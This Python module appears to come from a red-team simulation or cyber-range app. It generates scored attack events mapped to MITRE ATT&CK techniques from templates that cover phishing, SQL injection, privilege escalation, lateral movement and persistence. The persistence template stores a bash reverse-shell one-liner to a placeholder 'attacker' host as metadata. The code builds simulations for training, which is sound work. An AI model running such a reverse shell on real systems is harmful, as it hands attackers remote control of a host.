import random
from app.extensions import db
from app.models.attack_simulation import AttackSimulation
from app.models.attack_event import AttackEvent
from app.services.mitre_service import MitreService
from app.services.hook_service import HookService

STEP_TEMPLATES = {
    'phishing': {
        'tactic': 'initial_access',
        'technique_id': 'T1566',
        'severity': 'low',
        'source': 'external-malspam-node',
        'target': 'mailserver-internal',
        'description': 'Simulated spearphishing campaign containing a link to a credential harvesting site.',
        'payload': {'subject': 'Urgent Security Update', 'link': 'http://secure-update-login.local/login'}
    },
    'web_exploitation': {
        'tactic': 'execution',
        'technique_id': 'T1059',
        'severity': 'medium',
        'source': 'external-attacker-ip',
        'target': 'webserver-prod',
        'description': 'Simulated SQL Injection vulnerability exploitation to run system commands via xp_cmdshell.',
        'payload': {'vulnerability': 'SQLi', 'command': 'whoami /priv'}
    },
    'privilege_escalation': {
        'tactic': 'privilege_escalation',
        'technique_id': 'T1068',
        'severity': 'high',
        'source': 'webserver-prod',
        'target': 'webserver-prod',
        'description': 'Simulated local privilege escalation exploiting a kernel buffer overflow (Dirty COW simulation).',
        'payload': {'vulnerability': 'CVE-2016-5195', 'target_user': 'root'}
    },
    'lateral_movement': {
        'tactic': 'lateral_movement',
        'technique_id': 'T1210',
        'name': 'Exploitation of Remote Services',
        'severity': 'high',
        'source': 'webserver-prod',
        'target': 'db-server-prod',
        'description': 'Simulated lateral movement using stolen SSH key found in file history.',
        'payload': {'target_ip': '10.0.2.15', 'port': 22, 'credential_used': 'root_ssh_key'}
    },
    'persistence': {
        'tactic': 'persistence',
        'technique_id': 'T1078',
        'severity': 'medium',
        'source': 'db-server-prod',
        'target': 'db-server-prod',
        'description': 'Simulated persistence creation via cron job execution running every 5 minutes.',
        'payload': {'mechanism': 'cron_job', 'command': '/bin/bash -c "sh -i >& /dev/tcp/attacker/4444 0>&1"'}
    }
}

class RedTeamAIService:
    @staticmethod
    def simulate_attack_step(simulation: AttackSimulation, capability: str, mode: str = 'easy') -> AttackEvent:
        """
        Simulate a Red Team attack step.
        Calculates points and triggers appropriate hooks.
        """
        template = STEP_TEMPLATES.get(capability)
        if not template:
            raise ValueError(f"Unknown capability: {capability}")

        # Hook: before_attack_simulation
        HookService.trigger_hook('before_attack_simulation', simulation=simulation, capability=capability)

        # Scale severity and stealth based on mode
        severity = template['severity']
        base_points = 10.0
        
        if mode == 'medium':
            base_points = 20.0
            if severity == 'low': severity = 'medium'
        elif mode == 'hard':
            base_points = 30.0
            if severity in ('low', 'medium'): severity = 'high'
        elif mode == 'adaptive':
            base_points = 40.0
            severity = random.choice(['medium', 'high', 'critical'])

        # Create AttackEvent record
        event = AttackEvent(
            simulation_id=simulation.id,
            tactic=template['tactic'],
            severity=severity,
            source=template['source'],
            target=template['target'],
            points_awarded=base_points
        )
        event.payload_metadata = {
            'description': template['description'],
            'payload_details': template['payload'],
            'mode': mode
        }
        
        # Save to DB to map it to MITRE
        db.session.add(event)
        db.session.commit()

        # Map to MITRE Technique
        MitreService.map_event_to_mitre(event, template['technique_id'])

        # Update Simulation Red Team Score
        simulation.red_score += base_points
        db.session.commit()

        # Hook: after_attack_event
        HookService.trigger_hook('after_attack_event', event=event, simulation=simulation)

        return event
